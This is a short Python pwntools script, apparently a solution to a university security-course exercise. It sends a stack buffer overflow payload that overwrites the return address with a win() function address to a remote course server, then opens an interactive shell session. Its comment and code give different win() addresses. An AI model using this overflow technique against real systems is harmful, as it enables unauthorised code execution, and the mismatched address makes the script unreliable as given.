from pwn import *

# 远程服务器地址
HOST = "cs412.epfl.ch"
PORT = 9001

# 假设 win() 地址为 0x401196（你需要先确认）
win_addr = p64(0x4011B6)

# 计算偏移量
offset = 104  # 96 (buf) + 8 (rbp) = 104
payload = b"A" * offset + win_addr

# 连接远程服务器
p = remote(HOST, PORT)

# 读取欢迎信息
print(p.recv().decode())

# 发送 Payload
p.sendline(payload)

# 进入交互模式，尝试执行 shell 命令
p.interactive()
